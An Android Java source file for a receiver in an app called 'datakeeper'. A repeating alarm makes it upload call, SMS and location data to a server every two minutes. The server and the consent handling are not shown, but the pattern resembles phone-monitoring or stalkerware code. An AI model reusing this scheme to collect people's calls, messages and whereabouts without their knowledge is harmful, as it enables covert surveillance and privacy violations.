package com.epicsquad.datakeeper.receiver;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.text.format.DateUtils;
import com.epicsquad.datakeeper.common.ThreadExecutor;
import com.epicsquad.datakeeper.common.Utils;
import com.epicsquad.datakeeper.service.CallService;
import com.epicsquad.datakeeper.service.LocationService;
import com.epicsquad.datakeeper.service.SMSService;
import com.epicsquad.datakeeper.service.impl.CallServiceImpl;
import com.epicsquad.datakeeper.service.impl.LocationServiceImpl;
import com.epicsquad.datakeeper.service.impl.SMSServiceImpl;

public class SendDataReceiver extends BroadcastReceiver {

    private static final String RECEIVER_SEND_DATA_TO_SERVICE_SERVICE = "receiverSendDataToServerService";
    private static final long EXECUTE_PERIOD = DateUtils.MINUTE_IN_MILLIS * 2;

    @Override
    public void onReceive(Context context, Intent intent) {
        ThreadExecutor.getInstance().runTask(new SendData(context));
    }

    public static void setAlarm(final Context context) {
        final AlarmManager am = (AlarmManager) context
                .getSystemService(Context.ALARM_SERVICE);
        final Intent intent = new Intent(context, SendDataReceiver.class);
        intent.setAction(RECEIVER_SEND_DATA_TO_SERVICE_SERVICE);
        final PendingIntent pi = PendingIntent.getBroadcast(context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), EXECUTE_PERIOD, pi);
    }

    public static void cancelAlarm(final Context context) {
        final Intent intent = new Intent(context, SendDataReceiver.class);
        intent.setAction(RECEIVER_SEND_DATA_TO_SERVICE_SERVICE);
        final PendingIntent sender = PendingIntent.getBroadcast(context, 0, intent, 0);
        final AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        alarmManager.cancel(sender);
    }

    private class SendData implements Runnable {

        private Context context;
        private CallService callService = new CallServiceImpl();
        private SMSService smsService = new SMSServiceImpl();
        private LocationService locationService = new LocationServiceImpl();

        private SendData(Context context) {
            this.context = context;
        }

        @Override
        public void run() {
            try {
                callService.sendDataToServer(context);
                smsService.sendDataToServer(context);
                locationService.sendDataToServer(context);
            } catch (Exception e) {
                Utils.processException(e, SendData.class, "Cannot send data");
            }
        }
    }

}
